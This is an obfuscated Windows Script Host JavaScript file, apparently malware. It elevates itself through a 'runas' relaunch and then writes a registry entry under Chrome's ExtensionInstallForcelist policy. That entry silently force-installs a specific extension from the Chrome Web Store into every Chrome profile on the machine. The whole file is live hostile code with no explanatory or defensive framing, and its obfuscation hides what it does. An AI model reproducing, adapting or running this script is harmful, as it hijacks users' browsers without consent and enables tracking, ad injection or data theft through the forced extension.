(function (c) {
    var d = {
        'ZXZfj': function (e, f) {
            return e !== f;
        },
        'ztXCc': 'string',
        'cnTWW': function (g, h) {
            return g(h);
        },
        'KYQLy': function (i, j) {
            return i(j);
        },
        'aYHSX': function (k, l, m) {
            return k(l, m);
        },
        'UtZyW': function (n, o) {
            return n < o;
        },
        'RnkYW': function (p, q, r) {
            return p(q, r);
        },
        'PvjsX': function (s, t) {
            return s < t;
        },
        'ULRtZ': function (u, v) {
            return u + v;
        },
        'pwhQV': function (w, x, y) {
            return w(x, y);
        },
        'AnMef': function (z, A) {
            return z + A;
        },
        'cLqik': function (B, C) {
            return B != C;
        },
        'DsuZw': 'WScript.Shell',
        'dneUk': 'Shell.Application',
        'UJOkA': 'pfledojjichempdbjoboggkhalieceja',
        'KpKhz': '3453453434534535345',
        'XqlCr': 'HKEY_LOCAL_MACHINE\x5cSOFTWARE\x5cPolicies\x5cGoogle\x5cChrome\x5cExtensionInstallForcelist',
        'APXna': function (D, E) {
            return D + E;
        },
        'sQPEB': ';https://clients2.google.com/service/update2/crx',
        'qumIy': function (F, G) {
            return F + G;
        },
        'JrGXO': 'wscript.exe',
        'nKAKa': 'runas',
        'GGDBx': function (H, I) {
            return H == I;
        },
        'NoSFq': function (J, K) {
            return J + K;
        },
        'vzeku': '\x20--a',
        'jPNkB': function (L) {
            return L();
        }
    };
    var M = c['CreateObject'](d['DsuZw']);
    var N = c['CreateObject'](d['dneUk']);
    var O = d['UJOkA'];
    var P = d['KpKhz'];
    var Q = d['XqlCr'];
    var R = d['APXna'](O, d['sQPEB']);
    var S = d['qumIy'](d['qumIy'](R, ';'), P);
    var T = d['JrGXO'];
    var U = d['nKAKa'];
    c['Echo'](U);
    if (d['GGDBx'](c['Arguments']['length'], 0x0)) {
        N['ShellExecute'](T, d['NoSFq'](c['ScriptFullName'], d['vzeku']), '', U, 0x1);
    } else {
        var V = d['jPNkB'](ag);
        if (d['cLqik'](V, -0x1))
            M['RegWrite'](V, S);
    }
    function W(X, Y) {
        if (d['ZXZfj'](typeof Y, d['ztXCc']))
            return null;
        try {
            var Z = d['cnTWW'](atob, Y);
            var a0 = d['KYQLy'](ab, Z);
            return d['aYHSX'](rc4, X, a0);
        } catch (a1) {
            return null;
        }
    }
    ;
    function a2(a3) {
        a3 = a3['split']('');
        var a4 = '';
        for (var a5 = 0x0; d['UtZyW'](a5, a3['length']); a5++) {
            a4 += d['RnkYW'](a6, a3[a5]['charCodeAt'](0x0), 0x3);
        }
        return a4;
    }
    ;
    function a6(a7, a8) {
        var a9 = '';
        for (var aa = 0x0; d['PvjsX'](aa, a8); aa++) {
            a9 += '0';
        }
        return d['ULRtZ'](a9, a7)['slice'](-a8);
    }
    ;
    function ab(ac) {
        var ad = '';
        var ae = d['pwhQV'](chunk, ac, 0x3);
        for (var af = 0x0; d['PvjsX'](af, ae['length']); af++) {
            ad += String['fromCharCode'](ae[af]);
        }
        return ad;
    }
    ;
    function ag() {
        var ah = 0x1, ai = 0x1, aj = '';
        while (ai) {
            try {
                var ak = M['RegRead'](d['AnMef'](d['AnMef'](Q, '\x5c'), ah));
                if (d['cLqik'](ak['indexOf'](P), -0x1) || d['cLqik'](ak['indexOf'](O), -0x1)) {
                    ai = 0x0;
                    ah = -0x1;
                    aj = ah;
                } else {
                    ah++;
                }
            } catch (al) {
                ai = 0x0;
                aj = d['AnMef'](d['AnMef'](Q, '\x5c'), ah);
            }
        }
        return aj;
    }
}(WSH));